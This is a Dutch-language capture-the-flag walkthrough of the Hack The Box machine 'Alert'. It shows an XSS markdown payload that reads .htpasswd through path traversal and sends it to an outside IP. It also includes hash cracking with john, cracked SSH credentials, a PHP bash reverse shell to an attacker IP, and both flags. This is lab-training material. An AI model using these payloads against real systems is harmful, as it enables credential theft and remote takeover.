
Als eerst gaan we gaan scannen welke services er allemaal opstaan. Dit zullen we gaan doen aan de hand van het volgende commando:

```
nmap -p- -sCV 10.129.40.130 -vvvv
```

We kunnen zien dat er maar 2 services up zijn. De volgende services en porten staan er open.

```
Port 22: SSH

Port 80: Http
```

![image-20250102-165829.png](75956227.png)

Hier bij poort 80 zien we dat de niet gedirect wordt naar de website. Wat dus betekent dat we deze zullen moeten toevoegen aan de hosts file. Dit zullen we gaan doen aan de hand van het volgende commando:

```
sudo nano /etc/hosts
```

![image-20250102-170251.png](75300876.png)

Nu kan je zien dat we wel naar de website kunnen gaan.

![image-20250102-170329.png](76021775.png)

we gaan het de directories gaan kijken of dat er geen interessante dingen te vinden zijn zoals een subdomain, files, …

Dit zullen we gaan doen aan de hand van het volgende commando:

```
ffuf -u http://alert.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host:FUZZ.alert.htb" -ac
```

![image-20250102-174755.png](75923468.png)

Ik heb de volgende subdomain gevonden.

Ik ben gaan zoeken naar een exploit voor Markdown viewer. Hierbij heb ik het volgende script gezocht waarmee we een merkdown file gaan maken en deze zullen gaan uploaden op de website.

Script staat hieroder in code.

```
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.16.11:8888/?file_content=" + encodeURIComponent(data));
  });
</script>
```

1 keer dat we de file hebben upgeload, zien we onderin de ShareMarkdown staan.

![image-20250102-175636.png](75956241.png)

Als we over deze link gaan zien de volgende url boven komen.

![[Pasted image 20250122144541.png]]

Deze url ben ik is gaan testen door deze in te geven in de contact us. nu zien we op onze andere prompt waarop dat we een connectie hebben gestart voor de gegevens binnen te kunnen krijgen dat er een hash op ons beeld scherm komt. Dit betekend dus dat we connectie hebben kunnen maken met de server.

![image-20250102-175924.png](75923479.png)

Hiervan heb ik nu een hash file gemaakt zodat we deze hash kunnen gaan beginnen cracken. Voor dat ik de hash file heb gemaakt heb ik aan chatgpt gevraagd voor dit naar een code om te zetten waarmee ik kan gaan hacken.

![image-20250102-181007.png](75300896.png)

![image-20250102-181249.png](75300902.png)

Dit zal ik gaan doen aan de hand van het volgende commando:

```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash --> hash is de naam van mijn file waarin de hash is.

```
de hash is gecracked en we kunnen nu het password en de username gaan gebruiken voor in te kunnen loggen op de ssh server.

```
username: albert

password: manchesterunited
```

![image-20250102-181200.png](75923492.png)

zoals je kan zien zijn we nu ingelogd als de user albert.

![image-20250102-181348.png](75956254.png)

en hebben we dus hiermee nu ook de user flag gevonden.

user flag: 10a0f42e172f08d1dbb18b9ac1688980

![image-20250102-181423.png](75923498.png)

Dit wilt dus zeggen dat we nu ook op de subdomain statistics kunnen gaan inloggen met dezelfde user credentials.

![image-20250102-181719.png](76021796.png)

Ik ben gaan kijken in de /etc/hosts file en daar heb ik gezien dat er een webservices op 127.0.0.1 draait. We zullen aan de hand volgende commando deze gaan up zetten zodat we ermee kunnen connecteren.

```
ssh albert@alert.htb -L 8080:127.0.0.1:8080 
```

Als we dus nu gaan zoeken op het ip address 127.0.0.1:8080, dan gaan we het volgende te zien krijgen.

![image-20250102-183022.png](76021805.png)

als we nu is gaan kijken in de ssh connectie naar de monitors website. Als we daar het volgende commando gaan uitvoeren dan zullen we zien dat we via daar root kunnen worden.

![image-20250102-183531.png](75956264.png)

Met het commando “ls -ld“ gaan we laten zien welke rechten de directory heeft waarin we op dat moment zitten.

we gaan in de config directory de code gaan toevoegen waarmee we contact zullen gaan maken voor root user te bekomen.

![image-20250102-192023.png](75923515.png)

We gaan in dit path een .php file aanmaken en we zetten daar het volgende in.

```
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.135/100 0>&1'"); ?>
```

we gaan dit opslaan en open we een tweede terminal waarin we nc connectie opzetten. Dit zullen we gaan doen aan de hand van de volgende code:

```
sudo nc -lvnp 100
```

Als we nu naar het internet gaan en we zoeken de url op waar we zonet onze .php file hebben aangemaakt zullen we een connectie krijgen als root user.

![image-20250102-192312.png](75956276.png)

zoals je kan zien op je scherm hebben we een root connectie.

![image-20250102-192424.png](75300918.png)

Als we nu naar de root directory gaan zullen we daar de root flag zien staan en hebben we hierbij dus ook de root flag bemachtigd.

![image-20250102-192534.png](75923526.png)

Root Flag: 5a471196b1d20898edb394319d626c3e

![image-20250102-192819.png](75956284.png)
